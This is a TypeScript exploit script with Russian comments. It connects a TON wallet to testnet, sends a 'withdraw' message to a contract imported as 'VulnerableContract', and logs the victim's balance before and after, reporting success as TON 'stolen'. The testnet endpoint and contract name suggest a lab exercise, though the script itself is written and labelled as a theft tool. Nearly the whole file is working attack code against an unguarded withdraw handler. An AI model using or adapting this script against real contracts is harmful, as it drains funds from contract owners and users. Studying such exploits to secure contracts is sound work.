import { Address } from "@ton/core";
import { mnemonicToWalletKey } from "@ton/crypto";
import { TonClient, WalletContractV4, toNano, fromNano } from "@ton/ton";
import { VulnerableContract } from "../build/vulnerable_VulnerableContract";
import 'dotenv/config';

// НАСТРОЙКИ 
const MNEMONIC = process.env.HACK_MNEMONIC || "";
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS || "";
const API_KEY = process.env.TON_API_KEY || "";

async function runHack() {
    // Проверка
    if (MNEMONIC.includes("word1")) throw new Error("Вставьте сид-фразу!!");
    if (CONTRACT_ADDRESS.includes("kQ...")) throw new Error("Вставьте адрес контракта!");

    console.log("Инициализация хакера...");

    // 1. Настройка кошелька
    const key = await mnemonicToWalletKey(MNEMONIC.split(" "));
    const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });

    // 2. Подключение к сети
    const client = new TonClient({ 
        endpoint: "https://testnet.toncenter.com/api/v2/jsonRPC", 
        apiKey: API_KEY 
    });

    // 3. Инициализация цели (Контракта)
    const targetAddress = Address.parse(CONTRACT_ADDRESS);
    const contract = VulnerableContract.fromAddress(targetAddress);
    const contractProvider = client.open(contract);
    
    // Проверка баланса ДО
    const balanceBefore = await client.getBalance(targetAddress);
    console.log(`Баланс жертвы ДО атаки: ${fromNano(balanceBefore)} TON`);

    console.log("Отправляем транзакцию 'withdraw' (пытаемся украсть)...");

    const walletContract = client.open(wallet);
    const seqno = await walletContract.getSeqno();

    // 4. АТАКА
    await contractProvider.send(
        walletContract.sender(key.secretKey),
        {
            value: toNano("0.05"), // Немного газа на выполнение
        },
        // Текст сообщения должен точно совпадать с receive("...") в контракте
        "withdraw" 
    );

    // Ждем выполнения
    let currentSeqno = seqno;
    while (currentSeqno == seqno) {
        console.log("⏳ Ждем подтверждения блока...");
        await new Promise(r => setTimeout(r, 2000));
        currentSeqno = await walletContract.getSeqno();
    }

    console.log("Транзакция подтверждена!");
    
    // Проверка баланса ПОСЛЕ
    const balanceAfter = await client.getBalance(targetAddress);
    console.log(`Баланс жертвы ПОСЛЕ атаки: ${fromNano(balanceAfter)} TON`);
    
    const stolenAmount = balanceBefore - balanceAfter;

    if (balanceAfter < balanceBefore) {
        console.log(`УСПЕХ! Украдено: ~${fromNano(stolenAmount)} TON`);
        console.log("Контракт был уязвим и позволил вывод средств.");
    } else {
        console.log("НЕУДАЧА. Баланс не изменился.");
        console.log("Либо контракт уже защищен, либо команда 'withdraw' написана неправильно.");
    }
}

runHack();